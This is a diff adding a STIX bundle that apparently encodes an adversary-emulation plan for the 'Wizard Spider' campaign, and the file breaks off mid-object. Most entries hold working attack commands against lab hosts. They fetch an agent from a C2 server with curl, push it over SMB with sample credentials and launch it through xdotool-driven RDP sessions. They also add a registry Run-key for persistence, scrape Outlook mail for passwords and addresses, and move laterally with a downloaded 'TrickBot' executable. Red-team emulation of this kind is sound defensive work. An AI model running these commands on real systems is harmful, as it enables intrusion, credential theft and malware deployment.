@@ -1,0 +1,1771 @@
+{
+    "type": "bundle",
+    "id": "bundle--c5576309-c7c1-4497-b7ee-6c5f051940a5",
+    "objects": [
+        {
+            "type": "campaign",
+            "spec_version": "2.1",
+            "id": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "created": "2024-02-04T22:05:28.13615Z",
+            "modified": "2024-02-04T22:05:28.13615Z",
+            "name": "Wizard Spider",
+            "description": "Wizard Spider is a threat group considered to be a Russian-speaking cyber criminal gang associated with \"big game hunting\"."
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--605bb8dc-f6ef-411c-ad1f-94d91bc23ee6",
+            "created": "2024-02-04T22:05:28.136421Z",
+            "modified": "2024-02-04T22:05:28.136421Z",
+            "name": "Upload Agent Executable to Initial Target",
+            "description": "Uploads the agent executable to the target using smbclient.\nNote that this ability drops an executable rather than a malicious word doc.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince it will handle initial access to the target.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1105",
+                    "input_arguments": {
+                        "ad.domain.name": {
+                            "default": "oz",
+                            "description": "The short name of the target domain",
+                            "type": "string"
+                        },
+                        "initial.target.host": {
+                            "default": "10.0.0.7",
+                            "description": "The hostname or IPv4 address of the target host for initial access.",
+                            "type": "string"
+                        },
+                        "initial.user.name": {
+                            "default": "judy",
+                            "description": "The name of the target user account for initial access.",
+                            "type": "string"
+                        },
+                        "initial.user.password": {
+                            "default": "Passw0rd!",
+                            "description": "The password of the target user account for initial access.",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "cleanup": "rm -f ChristmasCard.exe\n",
+                                "command": "server=\"#{server}\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:windows\" -H \"server:$server\" -H \"group:dorothy\" $server/file/download > ChristmasCard.exe;\nchmod +x ChristmasCard.exe;\nsmbclient -U '#{ad.domain.name}\\#{initial.user.name}' //#{initial.target.host}/C$ -c \"put ./ChristmasCard.exe Users/#{initial.user.name}/Desktop\\ChristmasCard.exe;\" \"#{initial.user.password}\"\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d75df261-9912-4b18-ae64-810f20f2e9ef",
+            "created": "2024-02-04T22:05:28.137572Z",
+            "modified": "2024-02-04T22:05:28.137572Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--605bb8dc-f6ef-411c-ad1f-94d91bc23ee6",
+            "target_ref": "domain-name--1649df47-2de1-5552-ab21-f1584a44e7b0"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--1649df47-2de1-5552-ab21-f1584a44e7b0",
+            "value": "oz"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--2ce16db9-662c-4b93-9d20-b5d4e84674dd",
+            "created": "2024-02-04T22:05:28.138351Z",
+            "modified": "2024-02-04T22:05:28.138351Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--605bb8dc-f6ef-411c-ad1f-94d91bc23ee6",
+            "target_ref": "ipv4-addr--fa32103b-4f54-55f5-9649-a135ed962131"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--fa32103b-4f54-55f5-9649-a135ed962131",
+            "value": "10.0.0.7"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--09020886-734b-42b3-8b06-44d43691a600",
+            "created": "2024-02-04T22:05:28.139191Z",
+            "modified": "2024-02-04T22:05:28.139191Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--605bb8dc-f6ef-411c-ad1f-94d91bc23ee6",
+            "target_ref": "user-account--38a281cc-8a35-54b6-85d8-2680ae3440b1"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--38a281cc-8a35-54b6-85d8-2680ae3440b1",
+            "account_login": "judy"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--cbcf9890-a82c-4b86-b7ab-e1fb91da193d",
+            "created": "2024-02-04T22:05:28.14017Z",
+            "modified": "2024-02-04T22:05:28.14017Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--605bb8dc-f6ef-411c-ad1f-94d91bc23ee6",
+            "target_ref": "user-account--bfee8ace-1950-4322-853a-ac8ffcac2d0a"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--bfee8ace-1950-4322-853a-ac8ffcac2d0a",
+            "credential": "Passw0rd!"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--676d7302-01e0-40a2-ba4b-0a42b11aba2a",
+            "created": "2024-02-04T22:05:28.140391Z",
+            "modified": "2024-02-04T22:05:28.140391Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--605bb8dc-f6ef-411c-ad1f-94d91bc23ee6"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--5ca7a1b3-ff43-4057-b41f-0d8d4ecae848",
+            "created": "2024-02-04T22:05:28.140684Z",
+            "modified": "2024-02-04T22:05:28.140684Z",
+            "name": "RDP Connection to Initial Target (Dorothy)",
+            "description": "Start RDP connection to Initial Target in preparation for user execution.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince it will handle initial access to the target.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1078",
+                    "input_arguments": {
+                        "ad.domain.name": {
+                            "default": "oz",
+                            "description": "The short name of the target domain",
+                            "type": "string"
+                        },
+                        "initial.target.host": {
+                            "default": "10.0.0.7",
+                            "description": "The hostname or IPv4 address of the target host for initial access.",
+                            "type": "string"
+                        },
+                        "initial.user.name": {
+                            "default": "judy",
+                            "description": "The name of the target user account for initial access.",
+                            "type": "string"
+                        },
+                        "initial.user.password": {
+                            "default": "Passw0rd!",
+                            "description": "The password of the target user account for initial access.",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "linux": {
+                            "proc": {
+                                "command": "exec-background xfreerdp +clipboard /u:#{ad.domain.name}\\\\#{initial.user.name} /p:\"#{initial.user.password}\" /v:#{initial.target.host} /cert-ignore\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Valid Accounts"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--03e96a50-26ac-4c7d-bbd6-798d0f23132b",
+            "created": "2024-02-04T22:05:28.141407Z",
+            "modified": "2024-02-04T22:05:28.141407Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--5ca7a1b3-ff43-4057-b41f-0d8d4ecae848",
+            "target_ref": "domain-name--1649df47-2de1-5552-ab21-f1584a44e7b0"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--1649df47-2de1-5552-ab21-f1584a44e7b0",
+            "value": "oz"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--1d6e99fe-b72c-4447-a509-626372674ae9",
+            "created": "2024-02-04T22:05:28.144885Z",
+            "modified": "2024-02-04T22:05:28.144885Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--5ca7a1b3-ff43-4057-b41f-0d8d4ecae848",
+            "target_ref": "ipv4-addr--fa32103b-4f54-55f5-9649-a135ed962131"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--fa32103b-4f54-55f5-9649-a135ed962131",
+            "value": "10.0.0.7"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--79fb0d9d-91a3-482a-964d-07aba2d33f7e",
+            "created": "2024-02-04T22:05:28.145943Z",
+            "modified": "2024-02-04T22:05:28.145943Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--5ca7a1b3-ff43-4057-b41f-0d8d4ecae848",
+            "target_ref": "user-account--38a281cc-8a35-54b6-85d8-2680ae3440b1"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--38a281cc-8a35-54b6-85d8-2680ae3440b1",
+            "account_login": "judy"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--c545fbe3-c2d5-4abc-b3b2-e80f99bb6873",
+            "created": "2024-02-04T22:05:28.147117Z",
+            "modified": "2024-02-04T22:05:28.147117Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--5ca7a1b3-ff43-4057-b41f-0d8d4ecae848",
+            "target_ref": "user-account--d489db94-d843-4241-b351-c0dd4cfbe571"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--d489db94-d843-4241-b351-c0dd4cfbe571",
+            "credential": "Passw0rd!"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--28920467-cc7d-4c2a-81e9-efd5b4f7f43f",
+            "created": "2024-02-04T22:05:28.147393Z",
+            "modified": "2024-02-04T22:05:28.147393Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--5ca7a1b3-ff43-4057-b41f-0d8d4ecae848"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--bdf16e6e-ad27-4513-9d54-64289440265f",
+            "created": "2024-02-04T22:05:28.147639Z",
+            "modified": "2024-02-04T22:05:28.147639Z",
+            "name": "Run Agent Executable for Initial Access",
+            "description": "Gains initial access by running the uploaded agent executable to establish a C2 connection.\nNote that this ability runs an executable rather than a malicious word doc.\nThis ability must be run by an agent running on the attacker-controlled Linux machine (e.g. on the C2 server itself),\nsince it will handle initial access to the target. Requires xdotool to be installed on the running machine.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1204.002",
+                    "input_arguments": {
+                        "initial.target.host": {
+                            "default": "10.0.0.7",
+                            "description": "The hostname or IPv4 address of the target host for initial access.",
+                            "type": "string"
+                        },
+                        "initial.user.name": {
+                            "default": "judy",
+                            "description": "The name of the target user account for initial access.",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "sleep 30;\nrdp_pid=$(pgrep -f \"xfreerdp.*/v:#{initial.target.host}\");\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nxdotool key --window \"$rdp_window\" Super_L;\nsleep 5;\nxdotool windowactivate --sync \"$rdp_window\" type --delay 200 \"C:\\Users\\#{initial.user.name}\\Desktop\\ChristmasCard.exe\";\nsleep 3; xdotool key --window \"$rdp_window\" Return;\nsleep 30;\n",
+                                "timeout": 150
+                            }
+                        }
+                    },
+                    "technique_name": "User Execution: Malicious File"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--15baf7b7-7074-4e04-b4c6-54bf8a08b8dd",
+            "created": "2024-02-04T22:05:28.148516Z",
+            "modified": "2024-02-04T22:05:28.148516Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--bdf16e6e-ad27-4513-9d54-64289440265f",
+            "target_ref": "user-account--38a281cc-8a35-54b6-85d8-2680ae3440b1"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--38a281cc-8a35-54b6-85d8-2680ae3440b1",
+            "account_login": "judy"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--9a34a068-49ef-4034-9e90-a97560646440",
+            "created": "2024-02-04T22:05:28.149529Z",
+            "modified": "2024-02-04T22:05:28.149529Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--bdf16e6e-ad27-4513-9d54-64289440265f",
+            "target_ref": "ipv4-addr--fa32103b-4f54-55f5-9649-a135ed962131"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--fa32103b-4f54-55f5-9649-a135ed962131",
+            "value": "10.0.0.7"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--dbac0099-92ca-4dd2-886a-f602c9b3aa77",
+            "created": "2024-02-04T22:05:28.149816Z",
+            "modified": "2024-02-04T22:05:28.149816Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--bdf16e6e-ad27-4513-9d54-64289440265f"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--04cf7962-28c4-40fb-8915-1fd632393a6f",
+            "created": "2024-02-04T22:05:28.150053Z",
+            "modified": "2024-02-04T22:05:28.150053Z",
+            "name": "Emotet Persistence",
+            "description": "Wizard Spider establishes registry persistence by adding the blbdigital registry key.",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1547.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "cleanup": "reg.exe delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v blbdigital /f\n",
+                                "command": "reg.exe add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v blbdigital /t REG_SZ /d \"%userprofile%\\Ygyhlqt\\Bx5jfmo\\R43H.dll,Control_RunDLL\"\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--bafcc9fb-d9f1-4487-9b16-2b4e2c5fcabc",
+            "created": "2024-02-04T22:05:28.150267Z",
+            "modified": "2024-02-04T22:05:28.150267Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--04cf7962-28c4-40fb-8915-1fd632393a6f"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--1a925a0f-7f95-4d5c-9f95-9408f65063a6",
+            "created": "2024-02-04T22:05:28.150471Z",
+            "modified": "2024-02-04T22:05:28.150471Z",
+            "name": "Emotet System Info Discovery",
+            "description": "Wizard Spider performs system information discovery to collect information about the OS.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1082",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "proc": {
+                                "command": "systeminfo.exe\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Information Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--01f61593-254c-457f-9132-b5ad9d1e5ab5",
+            "created": "2024-02-04T22:05:28.150672Z",
+            "modified": "2024-02-04T22:05:28.150672Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--1a925a0f-7f95-4d5c-9f95-9408f65063a6"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--69ce4dd6-ab00-4c63-bcfd-ab02da96c63a",
+            "created": "2024-02-04T22:05:28.150899Z",
+            "modified": "2024-02-04T22:05:28.150899Z",
+            "name": "Emotet Process Discovery",
+            "description": "Emotet has been observed enumerating local processes.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1057",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "proc": {
+                                "command": "tasklist.exe\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Process Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--04d3f424-ed5d-448d-b421-efd8a5e3dc70",
+            "created": "2024-02-04T22:05:28.151119Z",
+            "modified": "2024-02-04T22:05:28.151119Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--69ce4dd6-ab00-4c63-bcfd-ab02da96c63a"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--b80ca347-2d2a-4e33-8683-1975cda6664f",
+            "created": "2024-02-04T22:05:28.151363Z",
+            "modified": "2024-02-04T22:05:28.151363Z",
+            "name": "Emotet Download Outlook Scraper DLL",
+            "description": "Wizard Spider downloads an Outlook scraper DLL and saves it as C:\\Windows\\SysWOW64\\Outlook.dll.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1105",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "cmd": {
+                                "cleanup": "del /f C:\\Windows\\SysWOW64\\Outlook.dll\n",
+                                "command": "move /y .\\OutlookScraper.dll C:\\Windows\\SysWOW64\\Outlook.dll\n",
+                                "payloads": [
+                                    "OutlookScraper.dll"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--627fa99b-6076-48e3-9e79-05a81bc4dd05",
+            "created": "2024-02-04T22:05:28.151595Z",
+            "modified": "2024-02-04T22:05:28.151595Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--b80ca347-2d2a-4e33-8683-1975cda6664f"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--16abc48a-1f69-4246-83e3-4d0cec0e8d81",
+            "created": "2024-02-04T22:05:28.151836Z",
+            "modified": "2024-02-04T22:05:28.151836Z",
+            "name": "Emotet Scrape Email Content From Outlook",
+            "description": "Wizard Spider leverages a module that scrapes email data from Outlook.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1552",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh": {
+                                "command": "Add-type -assembly \"Microsoft.Office.Interop.Outlook\" | out-null;\n$olFolders = \"Microsoft.Office.Interop.Outlook.olDefaultFolders\" -as [type];\n$outlook = new-object -comobject outlook.application;\n$namespace = $outlook.GetNameSpace(\"MAPI\");\n$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox);\n($folder.items | Select-Object -ExpandProperty Body | Select-String \"password\") -replace \"\\s+\", \" \" -join \";\";\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Unsecured Credentials"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--37a06b91-e438-4e1e-947f-eb3027a91b9a",
+            "created": "2024-02-04T22:05:28.152063Z",
+            "modified": "2024-02-04T22:05:28.152063Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--16abc48a-1f69-4246-83e3-4d0cec0e8d81"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--5a5c65c7-d0ff-4275-8f8e-ea0b617369bd",
+            "created": "2024-02-04T22:05:28.152296Z",
+            "modified": "2024-02-04T22:05:28.152296Z",
+            "name": "Emotet Scrape Email Addresses from Outlook",
+            "description": "Wizard Spider leverages a module that can scrape email addresses from Outlook.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1114.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh": {
+                                "command": "Add-type -assembly \"Microsoft.Office.Interop.Outlook\" | out-null;\n$olFolders = \"Microsoft.Office.Interop.Outlook.olDefaultFolders\" -as [type];\n$outlook = New-Object -comobject outlook.application;\n$namespace = $outlook.GetNameSpace(\"MAPI\");\n$folder = $namespace.getDefaultFolder($olFolders::olFolderInBox);\n($folder.items | Select-Object -Unique -ExpandProperty SenderEmailAddress) -join \";\";\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Email Collection: Local Email Collection"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e11fcd2f-60bf-4aa0-a235-e22f644a8828",
+            "created": "2024-02-04T22:05:28.15256Z",
+            "modified": "2024-02-04T22:05:28.15256Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--5a5c65c7-d0ff-4275-8f8e-ea0b617369bd"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--94942df6-6833-4e69-a6f7-89fda0ef25e1",
+            "created": "2024-02-04T22:05:28.152809Z",
+            "modified": "2024-02-04T22:05:28.152809Z",
+            "name": "Terminate RDP Session to Initial Target",
+            "description": "End the RDP session to the initial target.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince the RDP connection originates from the attacker's machine.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1021.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "proc": {
+                                "command": "pkill xfreerdp\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Remote Services: Remote Desktop Protocol"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--0160ad8b-370d-4cd5-8582-d784a96b3c63",
+            "created": "2024-02-04T22:05:28.153053Z",
+            "modified": "2024-02-04T22:05:28.153053Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--94942df6-6833-4e69-a6f7-89fda0ef25e1"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--070bfb3d-6938-4745-b1e7-039c97fdb7ca",
+            "created": "2024-02-04T22:05:28.153307Z",
+            "modified": "2024-02-04T22:05:28.153307Z",
+            "name": "Lateral Movement Via RDP (Toto)",
+            "description": "Uses discovered credentials to RDP into the next target host.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince the RDP connection must originate from the attacker's machine.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1021.001",
+                    "input_arguments": {
+                        "ad.domain.name": {
+                            "default": "oz",
+                            "description": "The short name of the target domain",
+                            "type": "string"
+                        },
+                        "second.target.host": {
+                            "default": "10.0.0.8",
+                            "description": "The hostname or IPv4 address of the target host for lateral movement.",
+                            "type": "string"
+                        },
+                        "second_host.user.name": {
+                            "default": "bill",
+                            "description": "The name of the target user account for lateral movement to the second target host.",
+                            "type": "string"
+                        },
+                        "second_host.user.password": {
+                            "default": "Fall2021",
+                            "description": "The password of the target user account for lateral movement to the second target host.",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "linux": {
+                            "proc": {
+                                "command": "exec-background xfreerdp +clipboard /u:#{ad.domain.name}\\\\#{second_host.user.name} /p:\"#{second_host.user.password}\" /v:#{second.target.host} /drive:X,./ /cert-ignore\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Remote Services: Remote Desktop Protocol"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8b16f2af-a5da-4474-a4f6-01fca5c9f556",
+            "created": "2024-02-04T22:05:28.154186Z",
+            "modified": "2024-02-04T22:05:28.154186Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--070bfb3d-6938-4745-b1e7-039c97fdb7ca",
+            "target_ref": "domain-name--1649df47-2de1-5552-ab21-f1584a44e7b0"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--1649df47-2de1-5552-ab21-f1584a44e7b0",
+            "value": "oz"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--5828f739-b076-4378-bd43-cf4e67cbb7d0",
+            "created": "2024-02-04T22:05:28.155354Z",
+            "modified": "2024-02-04T22:05:28.155354Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--070bfb3d-6938-4745-b1e7-039c97fdb7ca",
+            "target_ref": "ipv4-addr--bbf81084-1444-5c02-95f6-dc7a923e8788"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--bbf81084-1444-5c02-95f6-dc7a923e8788",
+            "value": "10.0.0.8"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--669c96ff-d118-42c5-acbc-fdd60a277e0f",
+            "created": "2024-02-04T22:05:28.15635Z",
+            "modified": "2024-02-04T22:05:28.15635Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--070bfb3d-6938-4745-b1e7-039c97fdb7ca",
+            "target_ref": "user-account--95ab6607-d0cb-57d5-a6da-ca52ba880027"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--95ab6607-d0cb-57d5-a6da-ca52ba880027",
+            "account_login": "bill"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--69ebf4d9-9a66-44cc-b740-1508ca3e9dbe",
+            "created": "2024-02-04T22:05:28.157589Z",
+            "modified": "2024-02-04T22:05:28.157589Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--070bfb3d-6938-4745-b1e7-039c97fdb7ca",
+            "target_ref": "user-account--1a5e5222-2ab0-41aa-a4d0-4e76b1cd24af"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--1a5e5222-2ab0-41aa-a4d0-4e76b1cd24af",
+            "credential": "Fall2021"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--00edb3b5-e134-4a36-a124-107702e1c265",
+            "created": "2024-02-04T22:05:28.157905Z",
+            "modified": "2024-02-04T22:05:28.157905Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+            "target_ref": "attack-pattern--070bfb3d-6938-4745-b1e7-039c97fdb7ca"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--1b21e49a-9550-4616-b125-d790a73165a6",
+            "created": "2024-02-04T22:05:28.158192Z",
+            "modified": "2024-02-04T22:05:28.158192Z",
+            "name": "Download and Execute Agent for Lateral Movement (Toto)",
+            "description": "Downloads a new agent executable and executes it on the target host over RDP.\nThis ability must be run by an agent running on the attacker-controlled Linux machine (e.g. on the C2 server itself),\nsince the RDP connection will be from the attacker's machine.\nRequires xdotool to be installed on the running machine.\n",
+            "extensions": {
+                "extension-definition--f3063f5c-f62a-419b-b9e2-c85ee281fe2b": {
+                    "attack_id": "T1105",
+                    "input_arguments": {
+                        "second.target.host": {
+                            "default": "10.0.0.8",
+                            "description": "The hostname or IPv4 address of the target host for lateral movement.",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "cleanup": "rm -f TrickBotClientExe.exe\n",
+                                "command": "server=\"#{server}\";\ncurl -s -X POST -H \"file:sandcat.go\" -H \"platform:windows\" -H \"server:$server\" -H \"group:toto\" $server/file/download > TrickBotClientExe.exe;\nchmod +x TrickBotClientExe.exe;\nsleep 30;\nrdp_pid=$(pgrep -f \"xfreerdp.*/v:#{second.target.host}\");\nrdp_window=$(xdotool search --pid \"$rdp_pid\");\nxdotool windowactivate --sync \"$rdp_window\" key Super_L;\nsleep 5; xdotool windowactivate --sync \"$rdp_window\" type --delay 200 \"cmd.exe\";\nsleep 3; xdotool windowactivate --sync \"$rdp_window\" key Return;\nsleep 10; xdotool windowactivate --sync \"$rdp_window\" type --delay 200 'copy \\\\tsclient\\X\\TrickBotClientExe.exe %AppData%\\uxtheme.exe';\nsleep 1; xdotool windowactivate --sync \"$rdp_window\" key Return;\nsleep 15; xdotool windowactivate --sync \"$rdp_window\" type --delay 200 \"cd %AppData%\";\nsleep 1; xdotool windowactivate --sync \"$rdp_window\" key Return;\nsleep 3; xdotool windowactivate --sync \"$rdp_window\" type --delay 200 \"uxtheme.exe\";\nsleep 1; xdotool windowactivate --sync \"$rdp_window\" key Return;\nsleep 30;\n",
+                                "timeout": 150
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--cf39bcf8-66df-4d92-ad91-1eb52835f1d8",
+            "created": "2024-02-04T22:05:28.159249Z",
+            "modified": "2024-02-04T22:05:28.159249Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--1b21e49a-9550-4616-b125-d790a73165a6",
+            "target_ref": "ipv4-addr--bbf81084-1444-5c02-95f6-dc7a923e8788"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--bbf81084-1444-5c02-95f6-dc7a923e8788",
